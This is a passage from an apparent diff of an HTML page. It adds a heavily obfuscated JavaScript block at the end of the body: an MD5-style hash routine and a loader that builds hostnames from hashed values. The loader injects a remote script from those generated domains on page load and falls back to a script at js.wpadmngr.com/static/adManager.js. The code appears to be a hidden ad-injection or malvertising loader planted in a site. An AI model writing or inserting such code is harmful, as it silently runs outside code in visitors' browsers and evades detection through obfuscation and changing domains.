f],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
+
+
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
